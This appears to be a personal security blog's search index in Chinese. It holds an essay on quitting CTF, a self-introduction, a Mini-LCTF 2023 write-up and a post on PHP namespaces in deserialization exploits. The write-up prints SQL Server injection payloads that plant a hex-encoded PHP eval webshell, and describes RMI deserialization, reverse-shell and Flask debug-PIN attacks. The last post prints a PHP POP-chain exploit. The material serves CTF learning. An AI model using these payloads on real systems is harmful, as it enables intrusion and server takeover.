<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>退役声明与CTF劝退指南</title>
      <link href="/2023/05/12/%E7%9C%9F%E9%80%80%E4%BA%86/"/>
      <url>/2023/05/12/%E7%9C%9F%E9%80%80%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这将是我写的最后一篇有关CTF的文章，并不是做标题党，我将详尽地分析劝退的原因（<strong>前排提醒，仅从个人角度出发对Web方向进行探讨</strong>）</p><p>本来还有个套路总结之类的想法，想来个最后的波纹。但实在心累，说实话没从CTF中收获到什么，也懒得好聚好散了，就这样吧。</p><h2 id="与漏洞挖掘、护网相比"><a href="#与漏洞挖掘、护网相比" class="headerlink" title="与漏洞挖掘、护网相比"></a>与漏洞挖掘、护网相比</h2><p>学安全重在实践，既然要劝退CTF，肯定也要给出更好的实践替代方案，在我看来除了纯纯的CTF天赋异禀选手，大部分人的更优解都是专注于漏洞挖掘这条赛道上，至于为什么，我将分几个方面来阐述。</p><h3 id="过程上的弊病：不够贴合实际工作内容"><a href="#过程上的弊病：不够贴合实际工作内容" class="headerlink" title="过程上的弊病：不够贴合实际工作内容"></a>过程上的弊病：不够贴合实际工作内容</h3><p>CTF（Capture the Flag）说白了就是做题，就是游戏。我们都说做事要看重过程，少看结果，可选手们在CTF竞赛学到的安全知识中往往混合有解题套路的惯性。题目一定有一个解，在这种应试的框架下你甚至能靠揣测出题人的意图来获取解题思路。然而实战并不一定有解，你努力半个月也可能一个高危漏洞都找不出，在这种情况下我们需要思考开发者的失误，需要从业务全局的角度去找到突破点，而这恰恰就是实际工作最需要的经验积累和思维积淀。我不否认有大佬能把两种思维完美融合在一起，但对大多数人来说，解题思维给实际工作带来的更多是冲突而不是增益。</p><h3 id="结果上的原罪：性价比低到不可接受"><a href="#结果上的原罪：性价比低到不可接受" class="headerlink" title="结果上的原罪：性价比低到不可接受"></a>结果上的原罪：性价比低到不可接受</h3><p>很多人在看完我对CTF过程的批判之后可能忍不住开喷了：都说应试教育烂，但学到的安全知识又不是假的，如果能拿到国赛一等奖可不比你说的护网挖洞有含金量多了？确实，不可否认CTF打得超好可以获得很丰厚的回报，但这真的容易吗？每年20支左右队伍一等奖，全国大学生竞争。可能你又说：不拿一等奖，二等奖三等奖也行啊，或者其他大比赛的奖，再次小奖总拿得到吧。那我再次笑嘻了，首先二等奖三等奖也不是那么好拿的，再说小奖，含金量完全比不上你拿到一张CNVD证书——HR一看你在xxxCTF得了奖，可能还得问你一下是谁办的~ 而且大比赛每年就一次，漏洞挖掘可是一整年都能尝试，下限实在好太多。至于上限……我没法评价哈。</p><h2 id="普通人需要怎么考虑"><a href="#普通人需要怎么考虑" class="headerlink" title="普通人需要怎么考虑"></a>普通人需要怎么考虑</h2><h3 id="以下雷点任踩一个我都极力劝退你专攻CTF"><a href="#以下雷点任踩一个我都极力劝退你专攻CTF" class="headerlink" title="以下雷点任踩一个我都极力劝退你专攻CTF"></a>以下雷点任踩一个我都极力劝退你专攻CTF</h3><h4 id="没能进校队"><a href="#没能进校队" class="headerlink" title="没能进校队"></a>没能进校队</h4><p>很多大比赛都限制一个学校的参赛队伍数量，后面的我不用说了…….</p><p>但是我还要补充一点，进校队受很多因素影响，有一些情况你是必进不去的：比如不缺你这个方向的同时你水平又很一般，而有些情况你又是必进的。在做选择之前务必把信息收集做到位，这真的是很重要的一个能力。</p><h4 id="天赋不够高"><a href="#天赋不够高" class="headerlink" title="天赋不够高"></a>天赋不够高</h4><p>我给个量化指标吧，半年内进不去任何大比赛的线下决赛，这条路可以放弃了</p><h4 id="学校没氛围"><a href="#学校没氛围" class="headerlink" title="学校没氛围"></a>学校没氛围</h4><p>关于这点，很多人可能会拿从0到1来反驳，我只能说这是面向普通人的劝退指南</p><h3 id="被劝退之后，如何对待CTF"><a href="#被劝退之后，如何对待CTF" class="headerlink" title="被劝退之后，如何对待CTF"></a>被劝退之后，如何对待CTF</h3><p>CTF是一种很好的入门安全的手段，通过对不同题型的练习，你可以针对性地学到或复习安全知识。但是在你有了足够的基础之后，请着手去挖洞实战吧！时间很宝贵，请把它用在最能提升自己的事情上。</p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>昨夜因为这个事纠结到两点才睡，这还是已经吃了褪黑素的情况，朋友们都在劝我，虽然嘴上说着不在意，真正放弃的时候还是挺难受的，感谢深夜还在安慰我的两位朋友。希望看到这篇文章的人都能远离这种痛苦的感受，通过深谋远虑的决策免于陷入人生的泥沼中。</p><p>如果你有不同观点，欢迎找我交流，就这样。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新的自我介绍</title>
      <link href="/2023/05/12/%E6%96%B0%E7%9A%84%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/05/12/%E6%96%B0%E7%9A%84%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="安全技术宅"><a href="#安全技术宅" class="headerlink" title="安全技术宅"></a>安全技术宅</h2><p>目前主要从事Web方向的漏洞挖掘，有往二进制方向转的意愿，当前的意向工作可能是Android逆向方面？（笑</p><p>这一方面就不展开了，博客以后不咋发技术文章，当然欢迎交流就是。</p><h2 id="音乐爱好者"><a href="#音乐爱好者" class="headerlink" title="音乐爱好者"></a>音乐爱好者</h2><h3 id="听"><a href="#听" class="headerlink" title="听"></a>听</h3><h4 id="华语R＆B"><a href="#华语R＆B" class="headerlink" title="华语R＆B"></a>华语R＆B</h4><p>主要听梦飞船、方大同（如果来西安开演唱会我一定要去看）、陶喆</p><h4 id="Jazz-hiphop"><a href="#Jazz-hiphop" class="headerlink" title="Jazz hiphop"></a>Jazz hiphop</h4><p>比较爱听Nujabes、蛋堡</p><h4 id="音游曲子"><a href="#音游曲子" class="headerlink" title="音游曲子"></a>音游曲子</h4><p>PSYQUI/Such、Emocosine、zekk</p><h4 id="JPOP"><a href="#JPOP" class="headerlink" title="JPOP"></a>JPOP</h4><p>真夜中</p><h3 id="唱"><a href="#唱" class="headerlink" title="唱"></a>唱</h3><p>我还挺能唱的，很多流行歌都会，如果去KTV可以拉上我（）</p><h3 id="作"><a href="#作" class="headerlink" title="作"></a>作</h3><p>暂且停留在准备阶段…….</p><h2 id="英语学习中"><a href="#英语学习中" class="headerlink" title="英语学习中"></a>英语学习中</h2><p>在做对空中英语教室系列的背诵（×   欢迎交流哦</p><h2 id="隐藏二次元"><a href="#隐藏二次元" class="headerlink" title="隐藏二次元"></a>隐藏二次元</h2><p>这季度看了天国大魔镜和魔法少女毁灭者，有同好欢迎交流</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mini-LCTF 2023 WriteUp By whocansee</title>
      <link href="/2023/05/07/Mini-LCTF-2023-WriteUp-By-whocansee/"/>
      <url>/2023/05/07/Mini-LCTF-2023-WriteUp-By-whocansee/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><blockquote><p> 这次比赛虽然艰难的AK了Web，但也让我发现自己比起大佬们还是有不小差距，恰逢协会换届，同届的同学已经当上了会长，我才刚刚有了点小成果，认识了一个低我一届的外校web手，拿了几乎所有web题的一血。看到这些，说没有心理落差肯定是假的，但又能怎样呢，生活还得继续，接受自己的平凡，在这个小成果上，朝着自己的目标慢慢前进吧！</p></blockquote><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="mini-java"><a href="#mini-java" class="headerlink" title="mini java"></a>mini java</h3><p><del>这个题难死我辣，虽然听出题人说是最最基础的java反序列化题（做出来之后再回顾，确实如此）但对于此前从来没做过java题的我来说确实太痛苦了，感谢出题人xl哥对我若智提问的不离不弃QAQ</del></p><p>首先说下思路吧，题目给出了源代码，从中可以发现靶机会调用lookup方法连上注册中心，在RMI中，这次过程的靶机就相当于客户端，而我们要做的就是用服务端来攻击客户端，网上有很多文章是讲这个的，这篇个人觉得比较好：<a href="https://xz.aliyun.com/t/7932#toc-2">https://xz.aliyun.com/t/7932#toc-2</a></p><p>此外，服务端必须要有公网IP，靶机才能去连接，这里建议服务端搭在自己的VPS上。</p><p>接下来说到具体的攻击手法，其实很简单，自己用Ysoserial起一个EXP/JRMP listener，设置好端口和payload，只要客户端对服务端用lookup发起请求，服务端就会返回一个包含了恶意payload的Exception，最终在客户端（也就是靶机上）实现RCE。</p><p>事情到这里都很美好，从确定方向是RMI，被出题人点醒RMI的远程方法调用是在服务端运行，客户端只是会接受服务端返回的结果后，我又看了一个B站UP白日梦组长的RMI系列视频，最终想好了具体的流程，<del>然而，折磨才刚刚开始</del></p><p>由于本人大一下选的Java是速成的，基础不能说一点没有吧，起码也是千疮百孔。所以在做题的过程中遇到了无数rz问题，单单一个readint、readbyte条件如何满足就卡了我将近一整天，在这里再次感谢xl哥555。考虑到具有良好Java基础的大佬们应该不会犯我这种低级错误，在wp里我就不多说自己踩的坑了，简单说说怎么满足条件。</p><p><img src="https://s2.loli.net/2023/05/07/GC7puA4MKORgFqb.png" alt="MTRSULXR_LV49C@NPUP@OZG.png" loading="lazy"></p><p>首先，虽然User类中定义的readObject方法是private，IDEA里显示no usage，但这里实际会调用到User类的readObject方法。而readint和readbyte都是在User类中的readObject方法中进行的，也就是说，int、byte、object得在一块儿，这就需要我们在User类中重写writeObject方法，顺便registry也在这里赋值了</p><p>（host填自己VPS的IP地址，另外VPS也要开放1099端口）：<img src="https://s2.loli.net/2023/05/07/Cz7rIXdKN9PTfy5.png" alt="FR5OGPL@EM_JQ@6WZUVGPBX.png" loading="lazy"></p><p>然后生成一个base64编码后的字节流</p><p><img src="https://s2.loli.net/2023/05/07/sG7egZNA2zBLU5C.png" alt="_825H4B_9I___LP_TQH4055.png" loading="lazy"></p><p>URL编码结果后用data参数传入网站，如果已经设置好了VPS，开启了Yso，显示error不要慌，这是因为返回了一个包含了恶意payload的Excption，看看Yso是否接收到了请求并返回Exception。至于payload，因为是无回显RCE，我试了很多常用的方法都不行，最后是VPS开监听，让靶机执行nc做到反弹shell，flag就在根目录。</p><p>这里附一个cn-sec讲CTF中无回显的文章<a href="http://cn-sec.com/archives/504625.html">http://cn-sec.com/archives/504625.html</a></p><p><del>关于这道题的更多细节就留到自己博客讲了（×</del></p><h3 id="FakeLogin"><a href="#FakeLogin" class="headerlink" title="FakeLogin"></a>FakeLogin</h3><p><del>据xl哥说这道题涉及的知识点组会讲过，我没听那次组会，但也知道有这种解法，因为没复现过所以一时没想起来，到后面XXE中的expect、ssh2全用了一遍都不行才想着往这条路走（</del></p><p>这道题就不放图了，当时做的时候一直开不了环境，换的台式机才开上，写wp用的笔记本，所以懒得换上去截图了（×）</p><p>一进来就是XXE，抓个包很容易就注入进去，发现了根目录的/flag，提示要RCE才能读真正的flag</p><p>关于XXE，找到一篇XDSEC前辈<a href="https://www.k0rz3n.com/">K0rz3n</a>写的文章，<a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a>     </p><p>可以算是非常详尽地介绍了XXE漏洞，我在利用方式里翻找了一番，对这道题使用了以下操作</p><ol><li>文件读取，把常见的都读了个遍</li><li>根据文件读取的结果，尝试探测内网开放情况与服务端口，结果连127.0.0.1都没有。。。（这里我换十六进制，xip.io什么的都试过了，还是不行）</li><li>尝试使用伪协议，能做到RCE的expect和ssh2都不行</li></ol><p>一筹莫展之际，我望着报错页面出神，突然觉得它不太协调，明明是个XXE的题，为啥用Flask模板来做后端，有没有一种可能……</p><p>方向确认之后就很简单了，花了差不多一小时找到EXP和所需的五个值，带进去算出来进入Debug，执行env从环境变量中拿到了flag</p><p>顺便给个网上找到的文章，里面有生成pin码的EXP，对这个知识点也介绍的很详尽了：<a href="https://blog.csdn.net/qq_35782055/article/details/129126825">https://blog.csdn.net/qq_35782055/article/details/129126825</a></p><p>PS：值得一提的是不同版本的python生成pin码的方式并不一样，这个毕竟报错页面会给你版本和路径，稍微注意下就行，不是什么大问题</p><p>啊对了还有，BurpSuite里的Render开不了Debug，记得在浏览器里面进去</p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>进去页面看到是个SQL注入的题，有结果回显，还直接给了语句。</p><p>![U80@_AP_2EV`R_MP5DS6_AK.png](<a href="https://s2.loli.net/2023/05/07/t9MpgjmGwx3KZrl.png">https://s2.loli.net/2023/05/07/t9MpgjmGwx3KZrl.png</a>)</p><p>拿出祖传字典fuzz一下，发现过滤了空格、星号、百分号、引号以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p>再结合题目描述的是让我们在非MySQL环境下拿根目录的flag，在这就能明确以下几点：</p><ol><li>增删查改语句大概率要用到（并且大概率可以堆叠注入）</li><li>我们需要通过文件读写或者RCE来拿根目录的flag</li><li>空格是一定得绕的，并且不是用括号绕，因为肯定要用到增删查改语句</li><li>解题方法大概率需要用到DBMS特性</li><li>引号用十六进制绕</li></ol><p>简单测了一下，发现以下几点</p><ol><li>数字型</li><li>可以堆叠注入</li><li>只回显第一个语句的结果</li><li>是sql server，并且版本很新，不存在用某CVE去做</li></ol><p>接下来开始考虑怎么绕空格，在这里我犯了很严重的失误，因为有段时间没看SQL注入了，临时去网上查到空白字符绕过空格的方式大部分都是采用URL编码，而我一想到过滤了百分号就把这种方式直接Pass了（真的经验严重不足）然而这个题是POST提交，根本就不用交%02啥的（另外，就算是GET提交%02也能过，后端检测是先解码再检测）——总之，我在这个问题上耽误了好久，最后是靠着hint解决了，害。</p><p>下一步就是查资料，找到文件读写或者RCE的方法写payload，这一步倒是很顺利，我了解到，和mysql不同，在sql server中不存在内置文件读写函数，那么就只能从RCE的方向入手。之后找到了一篇全面讲解sql server注入的文章（写入shell的具体原理请自行学习）</p><p><a href="http://www.ppmy.cn/news/9311.html">http://www.ppmy.cn/news/9311.html</a></p><p>里面给出了多种提权方式，xp_cmdshell、sp_oacreate、差异备份都尝试无果后，我利用log backup语句成功写入shell，以下介绍一下具体流程和踩坑：</p><p>因为某些申必原因（属实不懂为什么），自建数据库再插值再备份再进行log备份会报错（这里我已经手动备份了一次，但还是不行）（第一个是备份数据库的报错，说是报错，感觉也不像有错误啊…..）<img src="https://s2.loli.net/2023/05/07/fJhSutKnLFplaTd.png" alt="NY_VV8T3_TDY6@1F9_~R0_7.png" loading="lazy"><img src="https://s2.loli.net/2023/05/07/fKqVt1b3BHUQDLO.png" alt="5AX__8TBK2WQ_1@ZFMWJL5L.png" loading="lazy"></p><p>因此，考虑利用题目本身就有的数据库进行插值后log备份（前提是它本身就备份过一次）先说插值，我首先想到的是id，然而会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: inSertintousers(id)values(0x3c3f70687020406576616c28245f504f53545b2777686f63616e736565275d293b203f3e)</span><br></pre></td></tr></table></figure><p>![~8AH_ZP_@FM9N1`8PQ6_P_D.png](<a href="https://s2.loli.net/2023/05/07/4EunNYeiJUHcv3R.png">https://s2.loli.net/2023/05/07/4EunNYeiJUHcv3R.png</a>)</p><p>一开始我还以为是语法不对，但仔细地排查过后，我确信这个位置是可以用十六进制的，但就是不行，为什么呢？</p><p>在这里卡住了很长时间，万不得已向出题人咨询，总算被点醒，id是int类型的，插个char进去当然不行，而且这个报错信息啊。。。让人不明所以</p><p>那么就想想怎么办吧，肯定是换个字段插。报错信息其实已经告诉了name字段，如果没告诉也可以自己去查出来，但我当时是用的新建一个字段然后把一句话木马插到新的字段的方法，payload如下~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ALTERTABLEusersADDwcsvarchar(2000)NULL;</span><br><span class="line">1;inSertintousers(id,wcs,name)values(17,0x3c3f70687020706870696e666f28293b203f3e,36);</span><br><span class="line">1;declare@wcsvarchar(2000)set@wcs=0x2f7661722f7777772f68746d6c2f6f6b6f6b2e706870bacKuplogctftodisk=@wcswithinit;</span><br></pre></td></tr></table></figure><p>这里额外补充两点</p><ol><li>涉及到路径的时候，直接让disk=十六进制表示的路径会报错，所以采用了先定义变量再引用的方法</li><li>一写入就访问会提示没有权限，这个时候访问一次index.php再去访问马就可以了</li></ol><p>PS：写wp的时候试了试，不知道为啥我写马一直连不上去，测了phpinfo()是可以的，方法没问题</p><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p><del>这道题据出题人安权师傅说，我是校内第一个做出来的，真好捏，虽然是签到题（×）</del></p><p>首先进来就发现首页是典中典的无效页，直接上看源码、抓包、dirsearch三件套，除了抓包没什么收获，通过源码里的注释和dirsearch都能发现</p><p><img src="https://s2.loli.net/2023/05/07/93FcKGHkrlb8JXj.png" alt="_~_4EJ6USY_9Q_IA~4X7XQK.png" loading="lazy"></p><p>进入/shell.php</p><p>![MX`<a href="mailto:&#78;&#87;&#x53;&#x37;&#95;&#95;&#x4b;&#55;&#x42;&#95;&#95;&#64;&#x30;&#53;&#x4c;&#88;&#81;&#x50;&#x5f;&#66;&#46;&#112;&#x6e;&#103;">&#78;&#87;&#x53;&#x37;&#95;&#95;&#x4b;&#55;&#x42;&#95;&#95;&#64;&#x30;&#53;&#x4c;&#88;&#81;&#x50;&#x5f;&#66;&#46;&#112;&#x6e;&#103;</a>](<a href="https://s2.loli.net/2023/05/07/wYVc9M6A4rI13UT.png">https://s2.loli.net/2023/05/07/wYVc9M6A4rI13UT.png</a>)</p><p>稍有点经验就应该能看出来，要读flag.php就必须通过最后一行<code>$str1($str2);</code>来进行，而这两个变量又是怎么来的呢，是通过substr对<code>$class-&gt;$c()</code>的返回值做分割得到的，并且分割的区间可以由我们控制。这样一来思路就很清晰了，只需要让<code>$class-&gt;$c()</code>的返回值里包含我们需要的<code>system</code> <code>cat /flag</code>等字符串就可以了（当然必须是连续的）   </p><p>因此我们的目光投向了<code>$class = new $a($b);</code> 很好，三个参数a, b, c我们都能控制，接下来就是考虑，<strong>往什么类里传什么参数调用什么方法能返回我们需要的值</strong>，毫无疑问的一点是，<code>system</code> <code>cat /flag</code>等字符串肯定是我们传进去的参数，并且需要让他们保持原样拼接在返回值中，那么需要什么类和什么方法呢？</p><p>因而，我们来考虑源码中的过滤，对原生类的过滤中，SplFileObject被ban了其实无所谓，在这个题中本来也用不出来。Error被ban了还挺伤的，但也给了我们新的思路：在绕过中，最重要的思路之一就是寻找代替，比如——Exception</p><p>这里在本地试试就知道，原生类用Exception，调用__toString方法，返回值里可以包含我们传入的参数，结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span>: systemwhoami in C:\Code\Php\poc.php:<span class="number">4</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>但是这里有两个坑，我做题的时候很快就想到这样做，但执行命令一直没反应，这里先说第一个</p><p><strong>PHP版本差异带来的传入参数位置差异</strong></p><p>当时我在本地搭的环境打通了，可是题目里的一直不行，急坏了的我去咨询了下出题人，得知可能是我本地的PHP版本和题目的不同。我试了试PHP5和PHP7去运行同样的代码，返回的报错信息果然不同，具体地说，PHP5的报错信息会更多，因此传入的参数位置相较于PHP7会更加后移，但其实这个是可以爆破出来的，只需要在BurpSuite中把d设置为0<del>200，e设置为6</del>206，为什么设置要这么大的范围呢，因为反正不亏不如保险点（我当时就是因为爆破只设置0~30，完美避开了36…..）</p><p><strong>flag藏在了PHP文件的注释里</strong></p><p>经验丰富的老师傅肯定会第一时间Ctrl+U了，但菜鸡如我却会怀疑自己是不是哪里写错了（）最后是用BurpSuite爆破看返回页面长度找到的（话说页面长度也不是完全靠谱的，有些题会让关键回显和普通回显的页面长度一致，这时候需要筛选关键词或者状态码） 另外，在这种情况下也可以先不急，控制变量来排除问题，比如先执行一个whoami啥的，不管有没有回显都能立刻发现问题的真正所在。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p><del>Misc本来没打算做了，看了看排名，做一个签到题就可以涨一名，好吧，真香！</del></p><p>预想会很容易，没想到也花了将近两个小时才做出来。</p><p>上来就给了个压缩包，里面是pwd和flag压缩包，那很显然需要拿到密码去解压。拖到010editor里面去看，发现是wav的文件头，很久没做misc了，去搜了搜，出来一个频谱图的wp，照猫画虎拿到密码RxIsTheRealGod，解压flag</p><p>拖到010editor里面搜minil，得到提示和flag的前半段，要用到一个叫做SSTV的东西，再结合题目名字画外音，以及描述中的signal，需要用SSTV来接收信号。</p><p>去查了下这类题目的做法，首先要下个虚拟声卡把默认输入输出都变成声卡的，这样就可以让Potplayer播放的声音成为SSTV的输入，一边播放音频就能在SSTV中得到隐藏的图片，然后手写flag。</p><p>但是这个音频从哪儿来….虽然我进XDSEC靠的是misc，但在Noah师傅“纯学Misc没前途（除非取证）” 的劝诫下，我改学Web去了。misc题差不多有一年多没做过了，在这个地方卡了好久，甚至还尝试去播放pwd（）后来看到flag前半段的提示，应该是这个flag文件本身就有flag，需要配合SSTV取出来，010editor拖进去再看一遍，发现flag前面就是IEND结束符，把中间的flag去掉，从RIFF开始就是wav文件，选中到末尾，新建十六进制文件，粘贴进去保存，重命名为wav文件播放，结束~</p><p><img src="https://s2.loli.net/2023/05/07/F9lXAMCaTxBG2z6.png" alt="22T7IM@R_EWQ37KGOPC6UWT.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈PHP命名空间对于反序列化漏洞利用的影响</title>
      <link href="/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
      <url>/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>今天做了一道BUU上收录的2019强网杯upload，解题过程中拿到了题目源码，里面有个函数会对cookie进行反序列化，基本思路就是利用反序列化和源码中的魔术方法构造POP链进入upload_img函数绕过对上传文件的强制命名，从而拿到webshell</p><p>结果EXP都写好了，生成的字符串换到Cookie里面刷新却没能成功，找了别人的EXP过来对比自己也看不出哪里不一样，但是把别人的拿来用又行了，怎么会是呢？以下是我最开始写的EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$registed</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/1741b019882cc15c136b1977bcd295bc.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/shedsall.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>擦亮眼睛仔细对比后，我发现了自己写的EXP和别人的不同之处，他们的EXP开头都有一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br></pre></td></tr></table></figure><p>namespace的作用是分配命名空间，可以起到防止变量、函数、类名重复的效果，runoob上有一篇专门讲PHP中的命名空间的文章很不错：</p><p><a href="https://www.runoob.com/w3cnote/php-namespace-intro.html">https://www.runoob.com/w3cnote/php-namespace-intro.html</a></p><p>其中提到了当调用其它命名空间（如test）下的类名(如Register)时，需要使用<strong>\test\Register</strong> ：一种像文件路径的语法： <strong>\空间名\元素名</strong></p><p>而当我们用echo输出对EXP添加命名空间前后的序列化字符串时，也能发现其中的不同（上面的结果是不添加Namespace的，下面的反之）<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409201602246.png" alt="image-20230409201602246" loading="lazy"></p><p>类名从<strong>Register</strong>变成了<strong>app\web\controller\Register</strong>，即<strong>\空间名\元素名</strong>的语法，所以说<strong>序列化后的字符串是会受到namespace影响的</strong>。</p><p>那么问题来了，为什么我们一定要添加这行代码声明命名空间才能执行成功呢？我翻了翻题目源码：<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409202024875.png" alt="image-20230409202024875" loading="lazy"></p><p>原来是题目源码中规定好了这样的命名空间，所以也只有声明了同样命名空间的EXP才能生成有效的序列化字符串，不然类名都不同了。</p><p>这种疏忽完全来源于基础的薄弱……但是边做边学效率才是最高的，嗯…我认错但还是不改。</p><p>事情到这里就算告一段落，我写下这篇博客后也心满意足地看比赛去了~</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 PHP 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SQL语句不区分大小写的特性与盲注脚本碰撞所产生的一个坑</title>
      <link href="/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/"/>
      <url>/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/</url>
      
